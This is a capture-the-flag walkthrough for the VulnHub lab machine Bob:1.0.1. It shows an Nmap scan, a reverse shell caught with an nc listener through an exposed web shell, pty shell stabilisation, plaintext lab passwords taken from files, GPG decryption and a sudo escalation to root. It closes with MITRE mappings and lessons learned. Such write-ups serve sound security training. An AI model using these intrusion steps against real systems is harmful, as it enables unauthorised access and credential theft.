## Bob  


| **Platform**   | VulnHub               |
| -------------- | --------------------- |
| **Machine**    | Bob:1.0.1             |
| **Creator**    | c0rruptedb1t          |
| **OS**         | Linux                 |
| **Difficulty** | Beginner/Indermediate |


The first step after identifying the target machine w/ `netdiscover` is to run `Nmap` :  
  
`nmap -sC -sV -p- 10.0.2.18`  
  
  
| Port  | Service | Details                                       | Additional information                                                                                                                                                                                                              |
| ----- | ------- | --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80    | http    | Apache httpd 2.4.25 ((Debian))                | `\|_http-server-header: Apache/2.4.25 (Debian)`<br>`\| http-robots.txt: 4 disallowed entries` <br>`\| /login.php /dev_shell.php /lat_memo.html` <br>`\|_/passwords.html`<br>`\|_http-title: Site doesn't have a title (text/html).` |
| 25468 | SSH     | OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0) |                                                                                                                                                                                                                                     |


Go to the website.  

<img width="1352" height="902" alt="image" src="https://github.com/user-attachments/assets/121ea98f-722e-4e01-9f87-c6f2ecf944e0" />


`robots.txt` contains basically what `nmap` has shown us, with `passwords.html` not actually containing any passwords.  

<img width="1332" height="90" alt="image" src="https://github.com/user-attachments/assets/9338ae95-77ca-42c0-b45a-47d382de1976" />


  
#### Initial Access  


The `dev_shell.php` is an *actual shell as www-data*, which allows us to send a reverse shell to a listener.  

<img width="1352" height="696" alt="image" src="https://github.com/user-attachments/assets/b1542f07-bd63-4acd-af7f-3d814d8f897a" />


~~~
$ nc -lvnp 1337       
listening on [any] 1337 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.18] 57104
bash: cannot set terminal process group (500): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Milburg-High:/var/www/html$
~~~


stabilize the shell.  


~~~
`www-data@Milburg-High:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
~~~

  

By poking around we find out that we can access home directories of users  



~~~
www-data@Milburg-High:/home$ ls -la
ls -la
total 24
drwxr-xr-x  6 root   root   4096 Mar  4  2018 .
drwxr-xr-x 22 root   root   4096 Mar  5  2018 ..
drwxr-xr-x 18 bob    bob    4096 Mar  8  2018 bob
drwxr-xr-x 15 elliot elliot 4096 Feb 27  2018 elliot
drwxr-xr-x 15 jc     jc     4096 Feb 27  2018 jc
drwxr-xr-x 15 seb    seb    4096 Mar  5  2018 seb
~~~
  

Immediately interesting file `.old_passwordfile.html`.  


~~~
www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html
cat .old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
~~~


#### Privilege Escalation


Poking around further (i su to seb using the preciously found password, but it doesn't really matter here)


~~~
seb@Milburg-High:/home/bob/Documents/Secret/Keep_Out$ ls -la
ls -la
total 16
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Not_Porn
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 Porn
~~~


sadly the `/Porn` directory doesn't actually contain anything substantial, but the `/Not_Porn` directory does:


~~~
seb@Milburg-High:/home/bob/Documents/Secret/Keep_Out/Not_Porn$ cd No_Lookie_In_Here
<ents/Secret/Keep_Out/Not_Porn$ cd No_Lookie_In_Here           
<uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ls -la
ls -la
total 12
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
-rwxr-xr-x 1 bob bob  438 Mar  5  2018 notes.sh
<uments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ cat notes.sh
cat notes.sh
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
~~~


Its definitely something. (more specifically a password for something, which took me way too long to figure out)


We also find elliot's password in `/home/elliot/theadminisdumb.txt` (i ssh as him for stability at this point, again, doesn't really matter).
Now let's finally tackle the `login.txt.gpg` in bob's Document folder. 


~~~
elliot@Milburg-High:/home/bob/Documents$ ls -la
total 20
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt
elliot@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg
gpg: keybox '/home/elliot/.gnupg/pubring.kbx' created
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
~~~



we can see that it has a passphrase, which we have found earlier. 

<img width="888" height="650" alt="image" src="https://github.com/user-attachments/assets/c8d8f8e5-1513-47ee-9540-5797670e0064" />



~~~
elliot@Milburg-High:/home/bob/Documents$ su bob
Password: 
bob@Milburg-High:~/Documents$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)
~~~


Now we can get root access and the root flag.


~~~
bob@Milburg-High:/home$ sudo su
root@Milburg-High:/# cat flag.txt
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
~~~   


#### MITRE ATT&CK Mapping


| **Step**                                      | **Actions**                  | **Technique**                                         |
| --------------------------------------------- | ---------------------------- | ----------------------------------------------------- |
| Scan with Nmap                                | Service discovery            | T1595 Active scanning                                 |
| Access `dev_shell.php`                        | Access hidden file           | T1552.001 Unsecured Credentials: Credentials In Files |
| Reverse shell                                 | Initial Access               | T1078 Valid Account                                   |
| Acquire passwords from .old_passwordfile.html | Access unsecured credentials | T1552 Unsecured Credentials                           |
| Find passphrase                               | Access unsecured credentials | T1552 Unsecured Credentials                           |
| Get bob-level access                          | Privilege Escalation         | T1078 Valid Account                                   |
| Switch user to root                           | Privilege Escalation         | T1078 Valid Account                                   |
| Access root flag                              | Read local file              | T1005 Data from Local System                          |



#### Vulnerability Table


| **Vulnerability**                                 | **Impact**             |
| ------------------------------------------------- | ---------------------- |
| Easily available shell with no input sanitization | Reverse shell achieved |
| Plaintext credentials                             | Account access         |
| Unsecure storage of credentials                   | Account acces          |
| Unlimited privileges                              | Root access            |




#### Lessons Learned


- Do not make a web shell easily accessible
- Do not store passwords in files in plaintext
- Do not store passphrase hints close to the encrypted file (maybe don't store them at all if possible)
